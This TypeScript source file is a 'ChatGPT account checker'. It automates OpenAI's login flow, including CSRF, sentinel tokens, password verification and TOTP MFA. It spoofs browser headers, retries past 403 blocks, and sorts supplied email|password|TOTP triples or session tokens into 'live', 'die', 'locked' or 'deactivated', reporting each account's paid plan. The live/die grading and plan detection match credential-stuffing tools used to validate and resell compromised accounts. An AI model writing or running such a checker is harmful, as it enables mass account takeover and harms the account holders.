/**
 * ChatGPT account checker — ported from Python checker.py
 * Handles the full OpenAI/ChatGPT login flow including TOTP MFA.
 */

import * as crypto from "crypto";
// TOTP implemented via Node.js crypto (RFC 6238)
import * as crypto2 from "crypto";

/** Generate a 6-digit TOTP code from a base32 secret (RFC 6238 / RFC 4226) */
function generateTOTP(secret: string): string {
  // Decode base32 secret
  const b32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  const s = secret.toUpperCase().replace(/=+$/, "").replace(/\s/g, "");
  let bits = 0;
  let value = 0;
  const bytes: number[] = [];
  for (const ch of s) {
    const idx = b32chars.indexOf(ch);
    if (idx === -1) continue;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      bytes.push((value >>> (bits - 8)) & 0xff);
      bits -= 8;
    }
  }
  const keyBuf = Buffer.from(bytes);

  // HOTP counter = floor(epoch / 30)
  const counter = Math.floor(Date.now() / 1000 / 30);
  const counterBuf = Buffer.alloc(8);
  counterBuf.writeUInt32BE(Math.floor(counter / 0x100000000), 0);
  counterBuf.writeUInt32BE(counter >>> 0, 4);

  const hmac = crypto2.createHmac("sha1", keyBuf).update(counterBuf).digest();
  const offset = hmac[hmac.length - 1] & 0x0f;
  const code = ((hmac[offset] & 0x7f) << 24)
    | ((hmac[offset + 1] & 0xff) << 16)
    | ((hmac[offset + 2] & 0xff) << 8)
    | (hmac[offset + 3] & 0xff);
  return (code % 1_000_000).toString().padStart(6, "0");
}
import { CookieJar } from "./cookiejar.js";
import { getSentinelToken } from "./sentinel.js";
import { logger } from "./logger.js";

const CHATGPT_BASE = "https://chatgpt.com";
const AUTH_BASE = "https://auth.openai.com";

const URL_AUTH_LOGIN = `${CHATGPT_BASE}/auth/login`;
const URL_CSRF = `${CHATGPT_BASE}/api/auth/csrf`;
const URL_SIGNIN_OPENAI = `${CHATGPT_BASE}/api/auth/signin/openai`;
const URL_SESSION = `${CHATGPT_BASE}/api/auth/session`;
const URL_AUTHORIZE_CONTINUE = `${AUTH_BASE}/api/accounts/authorize/continue`;
const URL_PASSWORD_VERIFY = `${AUTH_BASE}/api/accounts/password/verify`;
const URL_MFA_ISSUE = `${AUTH_BASE}/api/accounts/mfa/issue_challenge`;
const URL_MFA_VERIFY = `${AUTH_BASE}/api/accounts/mfa/verify`;

const MFA_CHALLENGE_RE = /\/mfa-challenge\/([a-f0-9]+)/;
const MAX_REDIRECT_HOPS = 12;
const CALLBACK_VERIFY_ATTEMPTS = 3;
const HTTP_RETRY_ATTEMPTS = 3;

const CHROME_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";

const KEYWORDS_ACCOUNT_DEACTIVATED = [
  "deleted or deactivated",
  "has been deactivated",
  "does not have an account",
];

export type AccountStatus = "live" | "die" | "deactivated" | "locked" | "error";

export interface CheckResult {
  input: string;
  email: string | null;
  status: AccountStatus;
  user: string | null;
  plan: string | null;
  error: string | null;
  index?: number;
  completed?: number;
}

class LoginError extends Error {
  code: string;
  reason: string;
  constructor(opts: { code?: string; reason?: string; message?: string } = {}) {
    super(opts.message || opts.code || opts.reason || "login_error");
    this.code = opts.code || opts.reason || "login_network_error";
    this.reason = opts.reason || opts.code || "login_network_error";
  }
}

function navHeaders(referer: string, fetchSite: string): Record<string, string> {
  return {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,nl;q=0.8",
    "Referer": referer,
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": fetchSite,
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": CHROME_UA,
  };
}

function jsonHeaders(referer: string, origin: string): Record<string, string> {
  return {
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9,nl;q=0.8",
    "Referer": referer,
    "Origin": origin,
    "User-Agent": CHROME_UA,
  };
}

async function doFetch(
  url: string,
  opts: RequestInit & { cookies: CookieJar },
): Promise<Response> {
  const cookieHeader = opts.cookies.getCookieHeader(url);
  const headers = new Headers(opts.headers as Record<string, string>);
  if (cookieHeader) headers.set("Cookie", cookieHeader);

  const res = await fetch(url, {
    ...opts,
    headers,
    redirect: "manual",
  });

  // Parse and store cookies from response
  opts.cookies.setCookiesFromHeaders(res.headers, new URL(url).hostname);
  return res;
}

async function getFollow(
  url: string,
  headers: Record<string, string>,
  cookies: CookieJar,
  maxHops = MAX_REDIRECT_HOPS,
): Promise<[Response, string]> {
  let current = url;
  for (let i = 0; i < maxHops; i++) {
    const res = await doFetch(current, { method: "GET", headers, cookies });
    if ([301, 302, 303, 307, 308].includes(res.status)) {
      const location = res.headers.get("location");
      if (!location) break;
      current = new URL(location, current).toString();
      continue;
    }
    return [res, current];
  }
  throw new LoginError({ reason: "network_error", message: "Too many redirects" });
}

async function prime(cookies: CookieJar): Promise<void> {
  if (cookies.get("__cf_bm")) return;
  logger.info("[login] [0/9] prime chatgpt.com");
  const headers = navHeaders(`${CHATGPT_BASE}/`, "same-origin");
  for (let attempt = 0; attempt < HTTP_RETRY_ATTEMPTS; attempt++) {
    try {
      const res = await doFetch(URL_AUTH_LOGIN, { method: "GET", headers, cookies, redirect: "follow" });
      if (res.status < 400) return;
      if (res.status === 403 && attempt < HTTP_RETRY_ATTEMPTS - 1) {
        await sleep((attempt + 1) * 5000);
        continue;
      }
      return;
    } catch (e) {
      if (attempt < HTTP_RETRY_ATTEMPTS - 1) { await sleep(2000); continue; }
      throw new LoginError({ reason: "network_error" });
    }
  }
}

async function getCsrf(cookies: CookieJar): Promise<string> {
  logger.info("[login] [1/9] CSRF token");
  const headers = jsonHeaders(`${CHATGPT_BASE}/auth/login`, CHATGPT_BASE);
  for (let attempt = 0; attempt < HTTP_RETRY_ATTEMPTS; attempt++) {
    try {
      const res = await doFetch(URL_CSRF, { method: "GET", headers, cookies });
      if (res.status === 403 && attempt < HTTP_RETRY_ATTEMPTS - 1) {
        await sleep((attempt + 1) * 5000); continue;
      }
      if (res.status !== 200) throw new LoginError({ reason: "network_error" });
      const data = await res.json() as { csrfToken?: string };
      const csrf = data.csrfToken || "";
      if (!csrf) throw new LoginError({ reason: "network_error", message: "empty CSRF" });
      return csrf;
    } catch (e) {
      if (e instanceof LoginError) throw e;
      if (attempt < HTTP_RETRY_ATTEMPTS - 1) { await sleep(2000); continue; }
      throw new LoginError({ reason: "network_error", message: String(e) });
    }
  }
  throw new LoginError({ reason: "network_error" });
}

async function stepAuthUrl(
  csrf: string,
  deviceId: string,
  loginHint: string,
  cookies: CookieJar,
): Promise<string> {
  logger.info("[login] [2/9] authorize URL");
  const params = new URLSearchParams([
    ["prompt", "login"],
    ["ext-passkey-client-capabilities", "01001"],
    ["screen_hint", "login_or_signup"],
  ]);
  if (deviceId) params.append("ext-oai-did", deviceId);
  if (loginHint) params.append("login_hint", loginHint);

  const headers = jsonHeaders(`${CHATGPT_BASE}/auth/login`, CHATGPT_BASE);
  const body = new URLSearchParams({
    csrfToken: csrf,
    callbackUrl: `${CHATGPT_BASE}/`,
    json: "true",
  });

  const res = await doFetch(`${URL_SIGNIN_OPENAI}?${params}`, {
    method: "POST",
    headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
    cookies,
  });

  if (res.status !== 200) throw new LoginError({ reason: "network_error", message: `signin ${res.status}` });
  const data = await res.json() as { url?: string };
  const authUrl = data.url || "";
  if (!authUrl || !authUrl.includes("auth.openai.com")) {
    throw new LoginError({ reason: "network_error", message: "no auth URL" });
  }
  return authUrl;
}

async function bootstrap(email: string, useHint: boolean, cookies: CookieJar): Promise<[string, string]> {
  const defaultDid = crypto.randomUUID();
  await prime(cookies);
  const csrf = await getCsrf(cookies);
  const hint = useHint ? email : "";
  const authUrl = await stepAuthUrl(csrf, defaultDid, hint, cookies);

  logger.info("[login] [3/9] OAuth init (GET authorize)");
  const headers = navHeaders(`${CHATGPT_BASE}/`, "cross-site");
  const [, landing] = await getFollow(authUrl, headers, cookies);
  const deviceId = cookies.get("oai-did") || defaultDid;
  return [deviceId, landing];
}

function detectFlow(landing: string): string | null {
  if (landing.includes("/log-in/password")) return "password";
  if (landing.includes("/email-verification")) return "otp";
  return null;
}

async function authorizeContinue(
  email: string,
  sentinel: string,
  deviceId: string,
  cookies: CookieJar,
): Promise<Record<string, unknown>> {
  const headers: Record<string, string> = jsonHeaders(`${AUTH_BASE}/log-in`, AUTH_BASE);
  if (sentinel) headers["openai-sentinel-token"] = sentinel;
  if (deviceId) headers["oai-device-id"] = deviceId;

  const res = await doFetch(URL_AUTHORIZE_CONTINUE, {
    method: "POST",
    headers: { ...headers, "Content-Type": "application/json" },
    body: JSON.stringify({ username: { value: email, kind: "email" }, screen_hint: "login" }),
    cookies,
  });
  if (res.status !== 200) throw new LoginError({ reason: "network_error", message: `authorize/continue ${res.status}` });
  return await res.json() as Record<string, unknown>;
}

async function passwordVerify(
  password: string,
  deviceId: string,
  sentinel: string,
  cookies: CookieJar,
): Promise<Record<string, unknown>> {
  logger.info("[login] [4/9] password/verify");
  const headers: Record<string, string> = jsonHeaders(`${AUTH_BASE}/log-in/password`, AUTH_BASE);
  if (deviceId) headers["oai-device-id"] = deviceId;
  if (sentinel) headers["openai-sentinel-token"] = sentinel;

  const res = await doFetch(URL_PASSWORD_VERIFY, {
    method: "POST",
    headers: { ...headers, "Content-Type": "application/json" },
    body: JSON.stringify({ password }),
    cookies,
  });

  if ([401, 403].includes(res.status)) {
    const bodyLower = (await res.text()).toLowerCase();
    if (["mfa_required","totp_required","mfa"].some((k) => bodyLower.includes(k))) {
      throw new LoginError({ reason: "mfa_required" });
    }
    if (KEYWORDS_ACCOUNT_DEACTIVATED.some((k) => bodyLower.includes(k))) {
      throw new LoginError({ reason: "account_deactivated" });
    }
    if (["account_locked","account_disabled","banned","suspended"].some((k) => bodyLower.includes(k))) {
      throw new LoginError({ reason: "account_locked" });
    }
    throw new LoginError({ reason: "invalid_credential", message: `password ${res.status}` });
  }
  if (res.status !== 200) throw new LoginError({ reason: "network_error", message: `password ${res.status}` });
  return await res.json() as Record<string, unknown>;
}

async function mfaIssue(challengeId: string, deviceId: string, cookies: CookieJar): Promise<void> {
  const headers: Record<string, string> = jsonHeaders(`${AUTH_BASE}/mfa-challenge`, AUTH_BASE);
  if (deviceId) headers["oai-device-id"] = deviceId;
  try {
    await doFetch(URL_MFA_ISSUE, {
      method: "POST",
      headers: { ...headers, "Content-Type": "application/json" },
      body: JSON.stringify({ id: challengeId, type: "totp", force_fresh_challenge: false }),
      cookies,
    });
  } catch { /* ignore */ }
}

async function mfaVerify(
  challengeId: string,
  code: string,
  deviceId: string,
  cookies: CookieJar,
): Promise<Record<string, unknown>> {
  logger.info("[login] [5/9] MFA verify (TOTP)");
  const headers: Record<string, string> = jsonHeaders(`${AUTH_BASE}/mfa-challenge`, AUTH_BASE);
  if (deviceId) headers["oai-device-id"] = deviceId;

  const res = await doFetch(URL_MFA_VERIFY, {
    method: "POST",
    headers: { ...headers, "Content-Type": "application/json" },
    body: JSON.stringify({ id: challengeId, type: "totp", code }),
    cookies,
  });
  if (res.status !== 200) {
    if ([400, 401, 403].includes(res.status)) throw new LoginError({ reason: "mfa_required", message: "TOTP code wrong" });
    throw new LoginError({ reason: "network_error", message: `MFA ${res.status}` });
  }
  return await res.json() as Record<string, unknown>;
}

async function followToCallback(startUrl: string, cookies: CookieJar): Promise<string | null> {
  let current = startUrl;
  const headers = navHeaders(`${CHATGPT_BASE}/`, "cross-site");
  for (let i = 0; i < MAX_REDIRECT_HOPS; i++) {
    if (current.includes("/api/auth/callback/openai") && current.includes("code=")) {
      return current;
    }
    try {
      const res = await doFetch(current, { method: "GET", headers, cookies });
      if ([301, 302, 303, 307, 308].includes(res.status)) {
        const location = res.headers.get("location");
        if (!location) return null;
        current = new URL(location, current).toString();
        if (current.includes("/api/auth/callback/openai") && current.includes("code=")) {
          return current;
        }
      } else {
        return null;
      }
    } catch {
      return null;
    }
  }
  return null;
}

async function consumeCallback(callbackUrl: string, cookies: CookieJar): Promise<boolean> {
  if (!callbackUrl.includes("code=")) return false;
  const headers = navHeaders(`${AUTH_BASE}/`, "cross-site");
  let current = callbackUrl;
  for (let i = 0; i < MAX_REDIRECT_HOPS; i++) {
    try {
      const res = await doFetch(current, { method: "GET", headers, cookies });
      if (cookies.hasSessionToken()) return true;
      if ([301, 302, 303, 307, 308].includes(res.status)) {
        const location = res.headers.get("location");
        if (!location) break;
        current = new URL(location, current).toString();
      } else {
        break;
      }
    } catch {
      return cookies.hasSessionToken();
    }
  }
  return cookies.hasSessionToken();
}

async function consumeCallbackVerified(callbackUrl: string, cookies: CookieJar): Promise<boolean> {
  if (!callbackUrl.includes("code=")) return false;
  for (let attempt = 0; attempt < CALLBACK_VERIFY_ATTEMPTS; attempt++) {
    await consumeCallback(callbackUrl, cookies);
    if (cookies.hasSessionToken()) {
      logger.info(`[login] [6/9] callback verified (attempt ${attempt + 1})`);
      return true;
    }
    if (attempt < CALLBACK_VERIFY_ATTEMPTS - 1) await sleep(1000);
  }
  return false;
}

async function getSession(cookies: CookieJar): Promise<Record<string, unknown>> {
  logger.info("[login] [9/9] GET /api/auth/session");
  const headers = jsonHeaders(`${CHATGPT_BASE}/`, CHATGPT_BASE);
  const res = await doFetch(URL_SESSION, { method: "GET", headers, cookies });
  if (res.status !== 200) throw new LoginError({ reason: "network_error", message: `session ${res.status}` });
  return await res.json() as Record<string, unknown>;
}

function extractAccessToken(payload: Record<string, unknown>): string | null {
  for (const key of ["accessToken", "access_token"]) {
    const t = payload[key];
    if (typeof t === "string" && t) return t;
  }
  const user = payload["user"];
  if (user && typeof user === "object") {
    for (const key of ["accessToken", "access_token"]) {
      const t = (user as Record<string, unknown>)[key];
      if (typeof t === "string" && t) return t;
    }
  }
  return null;
}

/** Exact port of Python _detect_plan_from_data — 6-layer structured detection */
function detectPlanFromData(session: Record<string, unknown>, meData: Record<string, unknown>): string {
  type Obj = Record<string, unknown>;

  function planMatch(p: string): string | null {
    if (p === "plus" || p === "chatgptplusplan") return "Plus";
    if (p === "team" || p === "chatgptteamplan") return "Team";
    if (p === "pro"  || p === "chatgptproplan")  return "Pro";
    return null;
  }

  // ── Layer 1: session.subscription_plan + session.account.planType/plan_type ──
  if (session && typeof session === "object") {
    const subPlan = String(session["subscription_plan"] ?? "").toLowerCase();
    const accObj  = (session["account"] as Obj | null) ?? {};
    const accPlan = String(accObj["planType"] ?? accObj["plan_type"] ?? "").toLowerCase();

    for (const p of [subPlan, accPlan]) {
      const hit = planMatch(p);
      if (hit) return hit;
    }

    // ── Layer 2: session.accounts dict-of-dicts ──
    const accounts = session["accounts"];
    if (accounts && typeof accounts === "object" && !Array.isArray(accounts)) {
      for (const acc of Object.values(accounts as Obj)) {
        if (acc && typeof acc === "object") {
          const inner = ((acc as Obj)["account"] as Obj | null) ?? (acc as Obj);
          const pt = String(inner["plan_type"] ?? inner["planType"] ?? inner["structure"] ?? "").toLowerCase();
          const hit = planMatch(pt);
          if (hit) return hit;
        }
      }
    }

    // ── Layer 3: session.entitlements[] as string scan ──
    const sessionEnts = session["entitlements"];
    if (Array.isArray(sessionEnts)) {
      for (const ent of sessionEnts) {
        const es = String(ent).toLowerCase();
        if (es.includes("chatgptplusplan") || es.includes('"plan_type": "plus"') || es.includes("'plan_type': 'plus'")) return "Plus";
        if (es.includes("chatgptteamplan") || es.includes('"plan_type": "team"') || es.includes("'plan_type': 'team'")) return "Team";
        if (es.includes("chatgptproplan")  || es.includes('"plan_type": "pro"')  || es.includes("'plan_type': 'pro'"))  return "Pro";
      }
    }
  }

  // ── Layer 4: me_data.plan_type ──
  if (meData && typeof meData === "object") {
    const planType = String(meData["plan_type"] ?? "").toLowerCase();
    const hit = planMatch(planType);
    if (hit) return hit;

    // ── Layer 5: me_data.accounts (dict or list) ──
    const meAccounts = meData["accounts"];
    let accList: unknown[] = [];
    if (meAccounts && typeof meAccounts === "object") {
      accList = Array.isArray(meAccounts)
        ? meAccounts
        : Object.values(meAccounts as Obj);
    }
    for (const acc of accList) {
      if (acc && typeof acc === "object") {
        const inner = ((acc as Obj)["account"] as Obj | null) ?? (acc as Obj);
        const p = String(inner["plan_type"] ?? inner["planType"] ?? inner["structure"] ?? "").toLowerCase();
        const h = planMatch(p);
        if (h) return h;
      }
    }

    // ── Layer 6: me_data.entitlements[] with has_entitlement flag ──
    const meEnts = meData["entitlements"];
    if (Array.isArray(meEnts)) {
      for (const ent of meEnts) {
        if (ent && typeof ent === "object") {
          const e = ent as Obj;
          const hasEnt = Boolean(e["has_entitlement"]);
          const pt = String(e["plan_type"] ?? e["subscription_id"] ?? e["id"] ?? "").toLowerCase();
          if ((hasEnt || pt) && pt !== "free") {
            if (pt.includes("plus")) return "Plus";
            if (pt.includes("team")) return "Team";
            if (pt.includes("pro"))  return "Pro";
          }
        }
      }
    }
  }

  // ── Final fallback: full JSON string scan ──
  const combined = (JSON.stringify(session) + " " + JSON.stringify(meData)).toLowerCase();
  if (combined.includes("chatgptplusplan") || combined.includes('"plan_type": "plus"') || combined.includes("'plan_type': 'plus'") || combined.includes('"plan_type":"plus"') || combined.includes('"plantype": "plus"')) return "Plus";
  if (combined.includes("chatgptteamplan") || combined.includes('"plan_type": "team"') || combined.includes("'plan_type': 'team'") || combined.includes('"plan_type":"team"') || combined.includes('"plantype": "team"')) return "Team";
  if (combined.includes("chatgptproplan")  || combined.includes('"plan_type": "pro"')  || combined.includes("'plan_type': 'pro'")  || combined.includes('"plan_type":"pro"')  || combined.includes('"plantype": "pro"'))  return "Pro";

  return "Free";
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export async function checkAccount(
  email: string,
  password: string,
  totpSecret: string,
): Promise<CheckResult> {
  const result: CheckResult = {
    input: `${email}|***|***`,
    email,
    status: "die",
    user: null,
    plan: null,
    error: null,
  };

  const cookies = new CookieJar();

  try {
    let [deviceId, landing] = await bootstrap(email, true, cookies);
    logger.info({ landing: landing.slice(0, 100) }, "[login] landing");
    let flow = detectFlow(landing);

    if (!flow) {
      [deviceId, landing] = await bootstrap(email, false, cookies);
      flow = detectFlow(landing);

      if (!flow) {
        const cookieStr = cookies.getCookieHeader(AUTH_BASE);
        const sentinel = await getSentinelToken(deviceId, "login", cookieStr);
        const acData = await authorizeContinue(email, sentinel, deviceId, cookies) as Record<string, unknown>;
        const pageInfo = (acData["page"] as Record<string, unknown>) || {};
        const pageType = String(pageInfo["type"] || "").trim();
        const continueUrl = String(acData["continue_url"] || "").trim();
        if (pageType === "login_password" || continueUrl.includes("/log-in/password")) {
          flow = "password";
        } else if (pageType.includes("email") || continueUrl.includes("/email-verification")) {
          flow = "otp";
        }
      }
    }

    if (!flow) {
      result.error = "cannot determine login flow";
      return result;
    }
    if (flow === "otp") {
      result.error = "account uses passwordless OTP (not supported)";
      return result;
    }

    const cookieStr = cookies.getCookieHeader(AUTH_BASE);
    const sentinel = await getSentinelToken(deviceId, "login", cookieStr);
    const pwdData = await passwordVerify(password, deviceId, sentinel, cookies) as Record<string, unknown>;
    const pageInfo = (pwdData["page"] as Record<string, unknown>) || {};
    const pageType = String(pageInfo["type"] || "").trim();
    let continueUrl = String(pwdData["continue_url"] || "").trim();

    if (pageType.includes("mfa") || continueUrl.includes("mfa")) {
      const match = MFA_CHALLENGE_RE.exec(continueUrl);
      if (!match) {
        result.error = "MFA required but no challenge ID";
        return result;
      }
      const challengeId = match[1];
      if (!totpSecret) {
        result.error = "MFA required but no TOTP secret provided";
        return result;
      }
      await mfaIssue(challengeId, deviceId, cookies);
      let code: string;
      try {
        code = generateTOTP(totpSecret);
      } catch (e) {
        result.error = `invalid TOTP secret: ${e}`;
        return result;
      }
      const mfaData = await mfaVerify(challengeId, code, deviceId, cookies) as Record<string, unknown>;
      continueUrl = String(mfaData["continue_url"] || "").trim();
    }

    if (continueUrl.startsWith("/")) {
      continueUrl = new URL(continueUrl, AUTH_BASE).toString();
    }

    if (continueUrl && continueUrl.includes("auth.openai.com") && !continueUrl.includes("code=")) {
      const csrf2 = await getCsrf(cookies);
      const authUrl2 = await stepAuthUrl(csrf2, "", "", cookies);
      const cb = await followToCallback(authUrl2, cookies);
      if (cb) await consumeCallbackVerified(cb, cookies);
    } else if (continueUrl) {
      const cb = await followToCallback(continueUrl, cookies);
      if (cb) await consumeCallbackVerified(cb, cookies);
    } else {
      const csrf2 = await getCsrf(cookies);
      const authUrl2 = await stepAuthUrl(csrf2, "", "", cookies);
      const cb = await followToCallback(authUrl2, cookies);
      if (cb) await consumeCallbackVerified(cb, cookies);
    }

    if (!cookies.hasSessionToken()) {
      result.error = "login flow finished but no session cookie";
      return result;
    }

    const session = await getSession(cookies);
    const accessToken = extractAccessToken(session);
    if (!accessToken) {
      result.error = "no access_token in session";
      return result;
    }

    result.status = "live";
    const user = (session["user"] as Record<string, unknown>) || {};
    result.user = (user["name"] as string) || (user["email"] as string) || email;
    result.email = (user["email"] as string) || email;

    try {
      const meRes = await fetch("https://chatgpt.com/backend-api/me", {
        headers: {
          "Accept": "application/json",
          "Authorization": `Bearer ${accessToken}`,
          "Referer": "https://chatgpt.com/",
          "User-Agent": CHROME_UA,
          "Cookie": cookies.getCookieHeader("https://chatgpt.com"),
        },
      });
      if (meRes.ok) {
        const meData = await meRes.json() as Record<string, unknown>;
        result.plan = detectPlanFromData(session, meData);
      } else {
        result.plan = detectPlanFromData(session, {});
      }
    } catch {
      result.plan = detectPlanFromData(session, {});
    }

  } catch (e) {
    if (e instanceof LoginError) {
      result.error = e.reason;
      if (e.reason.includes("deactivated")) result.status = "deactivated";
      else if (e.reason.includes("locked")) result.status = "locked";
    } else {
      result.error = String(e).slice(0, 300);
    }
  }

  return result;
}

export async function checkSessionToken(token: string): Promise<CheckResult> {
  token = token.trim();
  const result: CheckResult = {
    input: token.length > 30 ? token.slice(0, 30) + "..." : token,
    email: null,
    status: "die",
    user: null,
    plan: null,
    error: null,
  };

  try {
    if (token.startsWith("eyJ")) {
      // JWT access token
      const res = await fetch("https://chatgpt.com/backend-api/me", {
        headers: {
          "Accept": "application/json",
          "Authorization": `Bearer ${token}`,
          "Accept-Language": "en-US,en;q=0.9",
          "User-Agent": CHROME_UA,
        },
      });
      if (res.ok) {
        const data = await res.json() as Record<string, unknown>;
        result.status = "live";
        result.user = (data["name"] as string) || (data["email"] as string) || "";
        result.email = (data["email"] as string) || "";
        result.plan = detectPlanFromData({}, data);
      } else if (res.status === 401) {
        result.error = "token expired or invalid";
      } else if (res.status === 403) {
        result.error = "access forbidden";
      } else {
        result.error = `HTTP ${res.status}`;
      }
    } else {
      // Session cookie
      const cookies = new CookieJar();
      cookies.set("__Secure-next-auth.session-token", token, "chatgpt.com");
      await prime(cookies);
      const headers = jsonHeaders(`${CHATGPT_BASE}/`, CHATGPT_BASE);
      const res = await doFetch(URL_SESSION, { method: "GET", headers, cookies });
      if (res.ok) {
        const data = await res.json() as Record<string, unknown>;
        if (data["user"]) {
          const user = data["user"] as Record<string, unknown>;
          result.status = "live";
          result.user = (user["name"] as string) || (user["email"] as string) || "";
          result.email = (user["email"] as string) || "";
          result.plan = detectPlanFromData(data, {});
        } else {
          result.error = "session expired";
        }
      } else {
        result.error = `HTTP ${res.status}`;
      }
    }
  } catch (e) {
    result.error = String(e).slice(0, 200);
  }

  return result;
}

